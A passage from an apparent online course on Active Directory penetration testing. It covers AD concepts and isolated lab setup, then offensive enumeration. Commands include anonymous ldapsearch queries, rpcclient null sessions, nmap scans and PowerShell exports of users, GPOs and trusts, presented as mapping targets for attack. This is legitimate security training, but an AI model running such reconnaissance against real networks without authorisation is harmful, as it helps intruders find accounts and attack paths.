Providing certificate-based authentication and encryption.</li>\n<li><strong>Azure Active Directory (Azure AD):</strong>  Microsoft&#39;s cloud-based identity and access management service (distinct from on-premise AD, but often integrated).</li>\n</ul>\n<h3>1.2 Key AD Components</h3>\n<p>Understanding these components is crucial for navigating and attacking Active Directory.</p>\n<ul>\n<li><strong>Domains:</strong>  A logical grouping of network objects (users, computers, groups) that share a common directory database and security policies.  Your lab will be a single domain.</li>\n<li><strong>Forests:</strong>  A collection of one or more domains that trust each other.  The first domain created in a forest is called the forest root domain.</li>\n<li><strong>Trees:</strong>  A hierarchical collection of domains that share a contiguous DNS namespace.  Domains within a tree trust each other transitively.</li>\n<li><strong>Organizational Units (OUs):</strong>  Containers within a domain that allow you to organize users, computers, and groups.  OUs are used to delegate administrative control and apply specific GPOs.</li>\n</ul>\n<p><strong>Analogy:</strong></p>\n<p>Think of a forest as a country.  Each tree is a state within that country, and each domain is a city within the state. OUs are neighborhoods within a city.</p>\n<h3>1.3 Domain Controllers</h3>\n<p>Domain Controllers (DCs) are the servers that hold the Active Directory database and are responsible for authenticating users and enforcing security policies.</p>\n<ul>\n<li><strong>Roles:</strong><ul>\n<li><strong>Primary Domain Controller (PDC) Emulator:</strong>  Handles password changes, time synchronization, and other critical operations.  In a single-domain environment, one DC holds this role.</li>\n<li><strong>RID Master:</strong>  Allocates blocks of Relative IDs (RIDs) to DCs for creating new objects.</li>\n<li><strong>Infrastructure Master:</strong>  Responsible for updating cross-domain group memberships.</li>\n<li><strong>Schema Master:</strong>  Controls updates to the Active Directory schema (the definition of object types and attributes).</li>\n<li><strong>Domain Naming Master:</strong>  Manages the addition and removal of domains within a forest.</li>\n</ul>\n</li>\n<li><strong>Replication:</strong> DCs replicate changes to the Active Directory database to each other, ensuring consistency.  Replication is critical for availability and fault tolerance.</li>\n<li><strong>Importance:</strong>  Compromising a Domain Controller is typically the ultimate goal of an Active Directory penetration test, as it grants full control of the domain.</li>\n</ul>\n<h3>1.4 Trust Relationships</h3>\n<p>Trust relationships allow users in one domain to access resources in another domain.  Understanding trust relationships is important for lateral movement in multi-domain environments.</p>\n<ul>\n<li><strong>Types:</strong><ul>\n<li><strong>Parent-Child Trust:</strong>  Automatically created between a parent domain and a child domain in a tree.</li>\n<li><strong>Forest Trust:</strong>  Trust between two entire forests.</li>\n<li><strong>External Trust:</strong>  Trust between an Active Directory domain and a domain running a different directory service (e.g., a Windows NT 4.0 domain).</li>\n<li><strong>Realm Trust:</strong> Trust between an Active Directory domain and a Kerberos realm (often used with Linux/Unix systems).</li>\n</ul>\n</li>\n<li><strong>Direction:</strong>  Trusts can be one-way or two-way.</li>\n<li><strong>Transitivity:</strong>  Trusts can be transitive (trust flows through multiple domains) or non-transitive.</li>\n</ul>\n<h3>1.5 Kerberos: The Heart of AD Authentication</h3>\n<p>Kerberos is the primary authentication protocol used in Active Directory. We&#39;ll delve into it much deeper later, but for now, a basic understanding is essential.</p>\n<ul>\n<li><strong>How it Works (Simplified):</strong><ol>\n<li>A client requests a Ticket Granting Ticket (TGT) from the Key Distribution Center (KDC) ‚Äì which runs on the Domain Controller ‚Äì by proving their identity (usually with a password).</li>\n<li>The KDC issues a TGT, encrypted with the KDC&#39;s secret key.</li>\n<li>The client presents the TGT to the KDC to request a service ticket for a specific service (e.g., accessing a file share).</li>\n<li>The KDC issues a service ticket, encrypted with the service&#39;s secret key.</li>\n<li>The client presents the service ticket to the service to gain access.</li>\n</ol>\n</li>\n<li><strong>Key Concepts:</strong><ul>\n<li><strong>Principal:</strong>  A unique identifier for a user, computer, or service.</li>\n<li><strong>Key Distribution Center (KDC):</strong>  The central authority for Kerberos authentication (runs on the Domain Controller).</li>\n<li><strong>Ticket Granting Ticket (TGT):</strong>  A ticket that allows a client to request service tickets.</li>\n<li><strong>Service Ticket:</strong>  A ticket that allows a client to access a specific service.</li>\n</ul>\n</li>\n</ul>\n<h3>1.6 Windows Server: Installation, Configuration, and Basic Management</h3>\n<p>We&#39;ll be using Windows Server as our Domain Controller.  Let&#39;s cover the basics.</p>\n<ul>\n<li><strong>Installation:</strong>  Download an ISO image of Windows Server (evaluation versions are available from Microsoft).  Create a new virtual machine in VMware or VirtualBox and boot from the ISO image.  Follow the installation prompts.  Choose the &quot;Server with Desktop Experience&quot; option for a graphical interface.</li>\n<li><strong>Configuration:</strong><ul>\n<li><strong>Static IP Address:</strong>  Assign a static IP address to your server.  This is crucial for DNS resolution and reliable communication.  Go to Network and Sharing Center -&gt; Change adapter settings -&gt; Right-click your network adapter -&gt; Properties -&gt; Internet Protocol Version 4 (TCP/IPv4) -&gt; Properties.  Enter a static IP address, subnet mask, default gateway, and preferred DNS server.  <strong>Important:</strong> The preferred DNS server <em>must</em> be the IP address of your Domain Controller (itself!).</li>\n<li><strong>Computer Name:</strong>  Set a descriptive computer name (e.g., <code>DC01</code>).  Right-click &quot;This PC&quot; -&gt; Properties -&gt; Change settings -&gt; Change.</li>\n<li><strong>Windows Updates:</strong>  Install the latest Windows updates.</li>\n</ul>\n</li>\n</ul>\n<h3>1.7 Windows Clients: Joining a Domain, User Profiles, and GPOs</h3>\n<p>We&#39;ll also need a Windows client machine to simulate a typical user workstation.</p>\n<ul>\n<li><strong>Installation:</strong>  Download an ISO image of Windows (Windows 10 or 11 is fine).  Create a new virtual machine and boot from the ISO image.  Follow the installation prompts.</li>\n<li><strong>Joining a Domain:</strong><ol>\n<li>Assign the client machine a static IP address on the same network as the Domain Controller.  Make sure the client&#39;s DNS server is set to the IP address of the Domain Controller.</li>\n<li>Right-click &quot;This PC&quot; -&gt; Properties -&gt; Change settings -&gt; Change.</li>\n<li>Select &quot;Domain&quot; and enter the name of your domain (e.g., <code>example.local</code>).</li>\n<li>You&#39;ll be prompted for domain administrator credentials.  Enter the credentials you created during the Domain Controller setup.</li>\n<li>Restart the client machine.</li>\n</ol>\n</li>\n<li><strong>User Profiles:</strong>  When a user logs in to the domain for the first time, a user profile is created.  This profile stores the user&#39;s settings, documents, and other data.</li>\n<li><strong>Group Policy Objects (GPOs):</strong>  GPOs are used to configure settings for users and computers in the domain.  We&#39;ll explore GPOs in more detail later.</li>\n</ul>\n<h3>1.8 Lab Setup: Virtualization, Domain Controller, Client, and Network Isolation</h3>\n<p>This is the most important part of this module.  A properly configured lab is essential for safe and effective penetration testing.</p>\n<ul>\n<li><strong>Virtualization Environment:</strong><ul>\n<li><strong>VMware Workstation/Player or VirtualBox:</strong> Choose your preferred virtualization platform.  Both are excellent choices.  VMware Workstation offers more advanced features, but VMware Player and VirtualBox are free for personal use.</li>\n<li><strong>Resource Allocation:</strong>  Allocate sufficient resources to your virtual machines.  A Domain Controller typically needs at least 4 GB of RAM and 2 virtual CPUs.  A client machine needs at least 2 GB of RAM and 1 virtual CPU.  Adjust these values based on your hardware and the demands of your testing.</li>\n</ul>\n</li>\n<li><strong>Windows Server Installation and Configuration as a Domain Controller:</strong><ol>\n<li><strong>Install Windows Server (as described above).</strong></li>\n<li><strong>Promote the Server to a Domain Controller:</strong><ul>\n<li>Open Server Manager.</li>\n<li>Click &quot;Add roles and features.&quot;</li>\n<li>Select &quot;Active Directory Domain Services&quot; and follow the prompts.</li>\n<li>Choose &quot;Add a new forest.&quot;</li>\n<li>Enter a root domain name (e.g., <code>example.local</code>).  <strong>Choose a domain name you will remember and use consistently.</strong></li>\n<li>Set a strong Directory Services Restore Mode (DSRM) password. <strong>IMPORTANT: Write this down and store it securely.  You&#39;ll need it to restore AD in case of disaster.</strong></li>\n<li>Accept the default settings for the remaining options.</li>\n<li>The server will restart after the installation is complete.  This process can take some time.</li>\n</ul>\n</li>\n</ol>\n</li>\n<li><strong>Windows Client Installation and Domain Joining (as described above).</strong></li>\n<li><strong>Network Isolation and Security Considerations:</strong>  <strong>This is paramount!</strong><ul>\n<li><strong>Internal Network:</strong>  Create an internal network within your virtualization environment.  This network should <em>not</em> have access to the internet or your host machine&#39;s network.  This prevents your testing activities from affecting your real network or other systems.<ul>\n<li><strong>VMware:</strong>  Use a &quot;Host-only&quot; network adapter for your virtual machines.  This creates a private network between the VMs and a virtual adapter on your host machine. The host adapter should <em>not</em> be connected to the internet or your main network.</li>\n<li><strong>VirtualBox:</strong>  Use an &quot;Internal Network&quot; adapter for your virtual machines.  This creates a private network that is isolated from the host machine and the internet.</li>\n</ul>\n</li>\n<li><strong>Firewall:</strong>  Configure the Windows Firewall on both the Domain Controller and the client machine.  For testing purposes, you can disable the firewall entirely, but in a real-world environment, you would need to configure specific firewall rules to allow necessary traffic.</li>\n<li><strong>Antivirus:</strong>  Consider disabling antivirus software on your virtual machines during testing.  Antivirus software can interfere with penetration testing tools and techniques.  <strong>However, be extremely careful when downloading and running potentially malicious files.</strong> Only do this in your isolated lab environment.</li>\n</ul>\n</li>\n</ul>\n<h3>1.9 Basic PowerShell Administration for AD</h3>\n<p>PowerShell is a powerful tool for managing Active Directory.  Let&#39;s look at some basic cmdlets.</p>\n<ul>\n<li><p><strong>Import the Active Directory Module:</strong>  Before you can use AD cmdlets, you need to import the Active Directory module.</p>\n<pre><code class=\"language-powershell\">Import-Module ActiveDirectory\n</code></pre>\n</li>\n<li><p><strong>Get-ADUser:</strong>  Retrieves user accounts.</p>\n<pre><code class=\"language-powershell\"># Get all user accounts\nGet-ADUser -Filter *\n\n# Get a specific user account\nGet-ADUser -Identity &quot;username&quot;\n\n# Get a user account and select specific properties\nGet-ADUser -Identity &quot;username&quot; -Properties SamAccountName, DisplayName, EmailAddress\n</code></pre>\n</li>\n<li><p><strong>Get-ADGroup:</strong>  Retrieves group accounts.</p>\n<pre><code class=\"language-powershell\"># Get all group accounts\nGet-ADGroup -Filter *\n\n# Get a specific group account\nGet-ADGroup -Identity &quot;groupname&quot;\n</code></pre>\n</li>\n<li><p><strong>Get-ADComputer:</strong>  Retrieves computer accounts.</p>\n<pre><code class=\"language-powershell\"># Get all computer accounts\nGet-ADComputer -Filter *\n\n# Get a specific computer account\nGet-ADComputer -Identity &quot;computername&quot;\n</code></pre>\n</li>\n<li><p><strong>Get-ADObject:</strong>  A generic cmdlet for retrieving any Active Directory object.</p>\n<pre><code class=\"language-powershell\"># Get an organizational unit\nGet-ADObject -Identity &quot;OU=MyOU,DC=example,DC=local&quot;\n</code></pre>\n</li>\n<li><p><strong>Example: Finding all users in a specific OU:</strong></p>\n<pre><code class=\"language-powershell\">Get-ADUser -Filter * -SearchBase &quot;OU=MyOU,DC=example,DC=local&quot;\n</code></pre>\n</li>\n</ul>\n<p>These are just a few basic examples.  PowerShell provides a vast array of cmdlets for managing Active Directory.  We&#39;ll explore more advanced PowerShell techniques in later modules.</p>\n<hr>\n<p><strong>Module 1 Project: Build Your Active Directory Lab</strong></p>\n<ol>\n<li><strong>Virtualization Setup:</strong> Install VMware Workstation/Player or VirtualBox and create a new virtual machine for your Domain Controller and client.</li>\n<li><strong>Windows Server Installation:</strong> Install Windows Server on the Domain Controller VM.</li>\n<li><strong>Domain Controller Configuration:</strong> Configure a static IP address, computer name, and promote the server to a Domain Controller using the Active Directory Domain Services role.  <strong>Remember the DSRM password!</strong></li>\n<li><strong>Windows Client Installation:</strong> Install Windows on the client VM.</li>\n<li><strong>Domain Joining:</strong> Join the client machine to the domain.</li>\n<li><strong>Network Isolation:</strong> Configure an internal network (Host-only in VMware, Internal Network in VirtualBox) to isolate your lab environment.</li>\n<li><strong>PowerShell Exploration:</strong>  Run the example PowerShell commands to explore your Active Directory environment.</li>\n<li><strong>Documentation:</strong> Create a document (e.g., a Word document or a Markdown file) and document each step of the lab setup process. Include screenshots and justifications for your configuration choices.  For example:<ul>\n<li>&quot;I chose a Host-only network in VMware because I want to completely isolate my lab environment from the internet and my host machine&#39;s network.&quot;</li>\n<li>&quot;I set a static IP address of 192.168.10.10 for the Domain Controller because a static IP is required for DNS resolution.&quot;</li>\n<li>&quot;I used the domain name <code>example.local</code> because it&#39;s a simple and easy-to-remember domain name.&quot;</li>\n<li>Include screenshots of the network adapter settings, the domain joining process, and the output of the PowerShell commands.</li>\n</ul>\n</li>\n</ol>\n<p><strong>This documentation will be a living document that you&#39;ll add to throughout the course.  The more detailed and thorough your documentation, the better you&#39;ll understand the concepts and the easier it will be to troubleshoot any issues.</strong></p>\n<p><strong>Troubleshooting Tips:</strong></p>\n<ul>\n<li><strong>DNS Resolution:</strong>  The most common problem during lab setup is DNS resolution.  Make sure that the client machine&#39;s DNS server is set to the IP address of the Domain Controller.  Use the <code>nslookup</code> command to verify that the client can resolve the domain name.</li>\n<li><strong>Firewall:</strong>  The Windows Firewall can block communication between the Domain Controller and the client machine.  For testing purposes, you can disable the firewall, but in a real-world environment, you would need to configure specific firewall rules.</li>\n<li><strong>Network Connectivity:</strong>  Make sure that the Domain Controller and the client machine are on the same network and can ping each other.</li>\n<li><strong>Event Logs:</strong>  Check the Windows Event Logs for error messages.  The Event Logs can provide valuable clues about the cause of problems.</li>\n</ul>\n<p>Good luck setting up your lab!  This is a crucial first step in your Active Directory penetration testing journey.  Don&#39;t be afraid to experiment and break things (within the safety of your isolated lab environment, of course!).  The more you experiment, the more you&#39;ll learn.  And remember, Google is your friend!</p>\n\n                </div>\n             </div>\n         ",
    "module-2": "\n             <div class=\"card main-content-card\"> <!-- Added main-content-card class -->\n                <h1>Module 2: module_2</h1> <!-- Use module title here -->\n                <div class=\"markdown-content\">\n                    <p>Alright, let&#39;s dive into Module 2: Active Directory Enumeration - The Reconnaissance Phase. This module is the bedrock of any successful Active Directory penetration test. You can have the best exploits in the world, but if you don&#39;t know <em>where</em> to point them, you&#39;re dead in the water. We&#39;re going to learn how to gather intelligence like seasoned spies, uncovering the secrets of the AD environment.</p>\n<hr>\n<p><strong>Module 2: Active Directory Enumeration - The Reconnaissance Phase</strong></p>\n<ul>\n<li><strong>Module Objective:</strong> Learn and apply various techniques to gather information about the Active Directory environment, identifying potential targets and vulnerabilities.</li>\n</ul>\n<hr>\n<p><strong>2.1: The Importance of Enumeration: Why it&#39;s the foundation of a successful attack</strong></p>\n<p>Imagine trying to navigate a city without a map. You&#39;d be wandering aimlessly, hoping to stumble upon your destination. That&#39;s what attacking Active Directory without proper enumeration is like. Enumeration provides the <em>map</em> of the AD environment. It allows you to:</p>\n<ul>\n<li><strong>Identify Targets:</strong> Discover user accounts, groups, computers, and services that are vulnerable or misconfigured.</li>\n<li><strong>Map Relationships:</strong> Understand how users, groups, and computers are connected, revealing potential attack paths.</li>\n<li><strong>Uncover Vulnerabilities:</strong> Identify weaknesses in the AD configuration, such as weak passwords, unpatched systems, or misconfigured permissions.</li>\n<li><strong>Prioritize Attacks:</strong> Focus your efforts on the most promising targets and attack vectors.</li>\n<li><strong>Avoid Detection:</strong> By understanding the environment, you can tailor your attacks to be less noisy and more likely to succeed.</li>\n</ul>\n<p>Without thorough enumeration, you&#39;re essentially throwing darts in the dark. You might get lucky, but you&#39;re far more likely to fail and get caught.</p>\n<p><strong>2.2: Basic Enumeration Techniques</strong></p>\n<p>Before we jump into the more specialized tools, let&#39;s cover some fundamental networking techniques that can provide valuable initial information.</p>\n<ul>\n<li><p><strong>2.2.1: <code>nslookup</code> and <code>dig</code> for DNS information gathering.</strong></p>\n<p>DNS is the phonebook of the internet (and your internal network). It translates human-readable domain names into IP addresses. Enumerating DNS can reveal important information about the AD environment, such as:</p>\n<ul>\n<li>Domain controllers: Their names and IP addresses.</li>\n<li>Service records (SRV records): Identifying Kerberos servers, LDAP servers, and other critical services.</li>\n<li>Hostnames: Discovering the names of computers on the network.</li>\n</ul>\n<p><strong><code>nslookup</code> Example:</strong></p>\n<pre><code class=\"language-bash\">nslookup -type=SRV _kerberos._tcp.yourdomain.local\n</code></pre>\n<p>Replace <code>yourdomain.local</code> with your lab domain. This query will return the SRV records for Kerberos, revealing the domain controllers.</p>\n<p><strong><code>dig</code> Example:</strong></p>\n<pre><code class=\"language-bash\">dig SRV _kerberos._tcp.yourdomain.local\n</code></pre>\n<p><code>dig</code> offers more detailed output than <code>nslookup</code>.  It&#39;s generally preferred by security professionals.</p>\n<p><strong>Interpreting the Results:</strong></p>\n<p>The output will show you the hostname and port number of your domain controllers.  For example:</p>\n<pre><code>_kerberos._tcp.yourdomain.local. 600 IN SRV 0 100 88 dc01.yourdomain.local.\n_kerberos._tcp.yourdomain.local. 600 IN SRV 0 100 88 dc02.yourdomain.local.\n</code></pre>\n<p>This tells you that <code>dc01.yourdomain.local</code> and <code>dc02.yourdomain.local</code> are domain controllers for the <code>yourdomain.local</code> domain, and they are listening on port 88 (the standard Kerberos port).</p>\n<p><strong>Why is this important?</strong> Knowing the domain controllers is crucial for later attacks, as these are the most sensitive targets.</p>\n</li>\n<li><p><strong>2.2.2: <code>ping</code> and <code>traceroute</code> for network discovery.</strong></p>\n<p>These tools are used to test network connectivity and map the network topology.</p>\n<p><strong><code>ping</code> Example:</strong></p>\n<pre><code class=\"language-bash\">ping dc01.yourdomain.local\n</code></pre>\n<p>This will send ICMP echo requests to the domain controller. If you receive a response, it means the domain controller is reachable.</p>\n<p><strong><code>traceroute</code> Example:</strong></p>\n<pre><code class=\"language-bash\">traceroute dc01.yourdomain.local\n</code></pre>\n<p>This will show you the path that packets take to reach the domain controller, revealing the network infrastructure.</p>\n<p><strong>Why is this important?</strong>  <code>ping</code> confirms reachability, while <code>traceroute</code> can help you understand the network layout and identify potential bottlenecks or security devices.  However, be aware that ICMP traffic is often blocked by firewalls.</p>\n</li>\n</ul>\n<p><strong>2.3: LDAP Enumeration</strong></p>\n<p>LDAP (Lightweight Directory Access Protocol) is the protocol used to access and modify directory information in Active Directory. Enumerating LDAP is a goldmine for information gathering.</p>\n<ul>\n<li><p><strong>2.3.1: <code>ldapsearch</code>: Understanding LDAP queries and syntax. Searching for users, groups, computers, and OUs.</strong></p>\n<p><code>ldapsearch</code> is a command-line tool for querying LDAP directories. It&#39;s incredibly powerful for gathering information about the AD environment.</p>\n<p><strong>Basic Syntax:</strong></p>\n<pre><code class=\"language-bash\">ldapsearch -x -h &lt;server&gt; -b &lt;base_dn&gt; &lt;filter&gt; &lt;attributes&gt;\n</code></pre>\n<ul>\n<li><code>-x</code>:  Use simple authentication (no SASL).</li>\n<li><code>-h &lt;server&gt;</code>:  The LDAP server to connect to (e.g., <code>dc01.yourdomain.local</code>).</li>\n<li><code>-b &lt;base_dn&gt;</code>:  The base distinguished name (DN) to search from (e.g., <code>dc=yourdomain,dc=local</code>).  This defines the starting point for the search. You can usually find this in the output of a DNS SRV record lookup.</li>\n<li><code>&lt;filter&gt;</code>:  The search filter (e.g., <code>(objectClass=user)</code>).</li>\n<li><code>&lt;attributes&gt;</code>:  The attributes to retrieve (e.g., <code>sAMAccountName,displayName,userPrincipalName</code>). If omitted, all attributes are returned.</li>\n</ul>\n<p><strong>Examples:</strong></p>\n<ul>\n<li><p><strong>List all users:</strong></p>\n<pre><code class=\"language-bash\">ldapsearch -x -h dc01.yourdomain.local -b dc=yourdomain,dc=local &quot;(objectClass=user)&quot; sAMAccountName displayName userPrincipalName\n</code></pre>\n</li>\n<li><p><strong>List all groups:</strong></p>\n<pre><code class=\"language-bash\">ldapsearch -x -h dc01.yourdomain.local -b dc=yourdomain,dc=local &quot;(objectClass=group)&quot; sAMAccountName displayName\n</code></pre>\n</li>\n<li><p><strong>List all computers:</strong></p>\n<pre><code class=\"language-bash\">ldapsearch -x -h dc01.yourdomain.local -b dc=yourdomain,dc=local &quot;(objectClass=computer)&quot; sAMAccountName dNSHostName operatingSystem\n</code></pre>\n</li>\n<li><p><strong>List all Organizational Units (OUs):</strong></p>\n<pre><code class=\"language-bash\">ldapsearch -x -h dc01.yourdomain.local -b dc=yourdomain,dc=local &quot;(objectClass=organizationalUnit)&quot; name distinguishedName\n</code></pre>\n</li>\n</ul>\n<p><strong>Interpreting the Results:</strong></p>\n<p>The output will be a series of LDAP entries, each representing a user, group, computer, or OU.  Each entry will contain a list of attributes and their values.</p>\n<p><strong>Why is this important?</strong>  <code>ldapsearch</code> allows you to gather a wealth of information about the AD environment, including user accounts, group memberships, computer names, and OU structure. This information is critical for identifying potential targets and planning your attack.</p>\n</li>\n<li><p><strong>2.3.2: LDAP filters: Crafting complex queries to target specific information.</strong></p>\n<p>LDAP filters allow you to refine your searches and retrieve only the information you need. Filters use a specific syntax based on boolean logic.</p>\n<p><strong>Common Filter Operators:</strong></p>\n<ul>\n<li><code>=</code>:  Equals</li>\n<li><code>~=</code>:  Approximate match</li>\n<li><code>&gt;=</code>:  Greater than or equal to</li>\n<li><code>&lt;=</code>:  Less than or equal to</li>\n<li><code>*</code>:  Wildcard</li>\n<li><code>&amp;</code>:  Logical AND</li>\n<li><code>|</code>:  Logical OR</li>\n<li><code>!</code>:  Logical NOT</li>\n</ul>\n<p><strong>Examples:</strong></p>\n<ul>\n<li><p><strong>Find all users with a specific email address:</strong></p>\n<pre><code class=\"language-bash\">ldapsearch -x -h dc01.yourdomain.local -b dc=yourdomain,dc=local &quot;(mail=testuser@yourdomain.local)&quot; sAMAccountName displayName userPrincipalName\n</code></pre>\n</li>\n<li><p><strong>Find all users whose display name starts with &quot;Admin&quot;:</strong></p>\n<pre><code class=\"language-bash\">ldapsearch -x -h dc01.yourdomain.local -b dc=yourdomain,dc=local &quot;(displayName=Admin*)&quot; sAMAccountName displayName userPrincipalName\n</code></pre>\n</li>\n<li><p><strong>Find all users who are members of the &quot;Domain Admins&quot; group:</strong></p>\n<p>This is a bit more complex, requiring you to know the distinguished name of the &quot;Domain Admins&quot; group.  First, find the DN:</p>\n<pre><code class=\"language-bash\">ldapsearch -x -h dc01.yourdomain.local -b dc=yourdomain,dc=local &quot;(sAMAccountName=Domain Admins)&quot; distinguishedName\n</code></pre>\n<p>Let&#39;s say the distinguished name is <code>CN=Domain Admins,CN=Users,DC=yourdomain,DC=local</code>.  Then the query would be:</p>\n<pre><code class=\"language-bash\">ldapsearch -x -h dc01.yourdomain.local -b dc=yourdomain,dc=local &quot;(memberOf=CN=Domain Admins,CN=Users,DC=yourdomain,DC=local)&quot; sAMAccountName displayName userPrincipalName\n</code></pre>\n</li>\n</ul>\n<p><strong>Why is this important?</strong>  Complex LDAP filters allow you to target specific information, such as users with specific roles, computers with specific software installed, or groups with specific permissions. This is crucial for identifying high-value targets and potential attack vectors.</p>\n</li>\n<li><p><strong>2.3.3: Anonymous vs. Authenticated LDAP enumeration.</strong></p>\n<p>By default, <code>ldapsearch</code> attempts to connect anonymously. However, you can also provide credentials to authenticate to the LDAP server.</p>\n<p><strong>Anonymous Enumeration:</strong></p>\n<p>The examples above all used anonymous enumeration (the <code>-x</code> flag disables SASL authentication, which is what would prompt for credentials).  This is often possible, but it provides limited information.</p>\n<p><strong>Authenticated Enumeration:</strong></p>\n<p>To authenticate, you can use the <code>-D</code> and <code>-W</code> flags to specify the bind DN and password:</p>\n<pre><code class=\"language-bash\">ldapsearch -x -h dc01.yourdomain.local -b dc=yourdomain,dc=local -D &quot;CN=testuser,CN=Users,DC=yourdomain,DC=local&quot; -W &quot;(objectClass=user)&quot; sAMAccountName displayName userPrincipalName\n</code></pre>\n<p>This will prompt you for the password of the user <code>testuser</code>.</p>\n<p><strong>Why is this important?</strong>  Authenticated enumeration provides significantly more information than anonymous enumeration.  Once you have compromised a single user account, you can use its credentials to gather more detailed information about the AD environment.  This is a key step in lateral movement.</p>\n</li>\n</ul>\n<p><strong>2.4: RPC Enumeration</strong></p>\n<p>RPC (Remote Procedure Call) is a protocol that allows programs on different computers to communicate with each other. Enumerating RPC services can reveal valuable information about the AD environment, such as open ports, shared resources, and running services.</p>\n<ul>\n<li><p><strong>2.4.1: <code>rpcclient</code>: Exploring RPC services and shares.</strong></p>\n<p><code>rpcclient</code> is a command-line tool for interacting with RPC services.  It&#39;s part of the Samba suite.</p>\n<p><strong>Basic Syntax:</strong></p>\n<pre><code class=\"language-bash\">rpcclient -U &quot;&quot; -N &lt;server&gt;\n</code></pre>\n<ul>\n<li><code>-U &quot;&quot;</code>:  Use an empty username.</li>\n<li><code>-N</code>:  Suppress password prompt.</li>\n<li><code>&lt;server&gt;</code>:  The server to connect to (e.g., <code>dc01.yourdomain.local</code>).</li>\n</ul>\n<p><strong>Common Commands within <code>rpcclient</code>:</strong></p>\n<ul>\n<li><code>enumdomusers</code>:  List domain users.</li>\n<li><code>enumdomgroups</code>:  List domain groups.</li>\n<li><code>srvinfo</code>:  Get server information.</li>\n<li><code>netshareenum</code>:  List network shares.</li>\n</ul>\n<p><strong>Examples:</strong></p>\n<pre><code class=\"language-bash\">rpcclient -U &quot;&quot; -N dc01.yourdomain.local\n</code></pre>\n<p>Once connected, you can run commands:</p>\n<pre><code>rpcclient $&gt; enumdomusers\nrpcclient $&gt; netshareenum\n</code></pre>\n<p><strong>Interpreting the Results:</strong></p>\n<p>The output will show you a list of users, groups, or shares. Pay attention to any shares that are accessible to everyone or that contain sensitive data.</p>\n<p><strong>Why is this important?</strong>  <code>rpcclient</code> can reveal valuable information about the AD environment, such as user accounts, group memberships, and network shares.  This can help you identify potential targets for credential theft or data exfiltration.</p>\n</li>\n<li><p><strong>2.4.2: Identifying open ports and services.</strong></p>\n<p>Use <code>nmap</code> to scan for open ports and services on the domain controllers.</p>\n<p><strong>Example:</strong></p>\n<pre><code class=\"language-bash\">nmap -sV -p 1-65535 dc01.yourdomain.local\n</code></pre>\n<ul>\n<li><code>-sV</code>:  Service version detection.</li>\n<li><code>-p 1-65535</code>:  Scan all ports.</li>\n</ul>\n<p><strong>Interpreting the Results:</strong></p>\n<p>The output will show you a list of open ports and the services running on those ports.  Pay attention to any unusual or unexpected services, as these could be vulnerable to exploitation.  Common ports to look for include:</p>\n<ul>\n<li>135: RPC Endpoint Mapper</li>\n<li>139: NetBIOS Session Service</li>\n<li>445: SMB</li>\n<li>3389: RDP (Remote Desktop Protocol)</li>\n<li>5985: WinRM (Windows Remote Management)</li>\n</ul>\n</li>\n<li><p><strong>2.4.3: Gathering NetBIOS information.</strong></p>\n<p>NetBIOS (Network Basic Input/Output System) is an older protocol that is still used by some Windows systems.  You can use <code>nbtscan</code> to gather NetBIOS information.  Note: <code>nbtscan</code> may need to be installed separately.</p>\n<p><strong>Example:</strong></p>\n<pre><code class=\"language-bash\">nbtscan 192.168.1.0/24\n</code></pre>\n<p>Replace <code>192.168.1.0/24</code> with your lab network range.</p>\n<p><strong>Interpreting the Results:</strong></p>\n<p>The output will show you the NetBIOS names of computers on the network, as well as their MAC addresses.  This can help you identify potential targets for lateral movement.</p>\n<p><strong>Why is this important?</strong>  Identifying open ports and services allows you to focus your efforts on vulnerable systems.  NetBIOS information can provide additional clues about the network environment.</p>\n</li>\n</ul>\n<p><strong>2.5: PowerShell Enumeration</strong></p>\n<p>PowerShell is a powerful scripting language that is built into Windows. It provides a rich set of cmdlets for managing Active Directory. You can use PowerShell to enumerate the AD environment from a compromised Windows machine.</p>\n<ul>\n<li><p><strong>2.5.1: <code>Get-ADUser</code>, <code>Get-ADGroup</code>, <code>Get-ADComputer</code> cmdlets.</strong></p>\n<p>These cmdlets allow you to retrieve information about users, groups, and computers in the AD environment.</p>\n<p><strong>Examples:</strong></p>\n<pre><code class=\"language-powershell\"># Get all users\nGet-ADUser -Filter * -Properties * | Select-Object SamAccountName, DisplayName, UserPrincipalName | Export-Csv -Path users.csv\n\n# Get all groups\nGet-ADGroup -Filter * -Properties * | Select-Object SamAccountName, Name, GroupCategory | Export-Csv -Path groups.csv\n\n# Get all computers\nGet-ADComputer -Filter * -Properties * | Select-Object Name, OperatingSystem, IPv4Address | Export-Csv -Path computers.csv\n</code></pre>\n<p><strong>Interpreting the Results:</strong></p>\n<p>The output will be a list of users, groups, or computers, along with their attributes.  You can use the <code>Select-Object</code> cmdlet to specify which attributes to retrieve.  The <code>Export-Csv</code> cmdlet saves the output to a CSV file, which can be easily analyzed.</p>\n<p><strong>Why is this important?</strong>  PowerShell provides a powerful and flexible way to enumerate the AD environment from a compromised Windows machine.  The ability to export the data to a CSV file makes it easy to analyze and search for specific information.</p>\n</li>\n<li><p><strong>2.5.2: Enumerating Group Policy Objects (GPOs).</strong></p>\n<p>GPOs are used to manage the configuration of Windows systems. Enumerating GPOs can reveal valuable information about the security policies in place, as well as potential vulnerabilities.</p>\n<p><strong>Example:</strong></p>\n<pre><code class=\"language-powershell\">Get-GPO -All | Select-Object DisplayName, Id | Export-Csv -Path gpos.csv\nGet-GPOReport -All -ReportType HTML -Path gpo_reports.html\n</code></pre>\n<p>The first command lists all GPOs and exports their display names and IDs to a CSV file. The second command generates HTML reports for each GPO, which can be analyzed for security vulnerabilities.  You&#39;ll need the <code>GroupPolicy</code> module installed for these to work. This usually comes with the RSAT tools.</p>\n<p><strong>Why is this important?</strong> GPOs can contain sensitive information, such as passwords, scripts, and configuration settings. Enumerating GPOs can reveal potential vulnerabilities that can be exploited to gain control of the AD environment. For example, a GPO might contain a script that runs with elevated privileges, or it might configure a system to allow remote access.</p>\n</li>\n<li><p><strong>2.5.3: Discovering trust relationships.</strong></p>\n<p>Trust relationships allow users in one domain to access resources in another domain. Enumerating trust relationships can reveal potential attack paths between domains.</p>\n<p><strong>Example:</strong></p>\n<pre><code class=\"language-powershell\">Get-ADTrust -Filter * -Properties * | Select-Object Name, TargetDomain, TrustDirection, TrustType | Export-Csv -Path trusts.csv\n</code></pre>\n<p><strong>Interpreting the Results:</strong></p>\n<p>The output will show you a list of trust relationships, along with their attributes. Pay attention to the <code>TrustDirection</code> attribute, which indicates the direction of the trust (e.g., <code>Inbound</code>, <code>Outbound</code>, <code>Bidirectional</code>).</p>\n<p><strong>Why is this important?</strong>  Trust relationships can be exploited to gain access to resources in other domains.  For example, if you compromise a domain that trusts another domain, you may be able to use that trust to gain access to the trusted 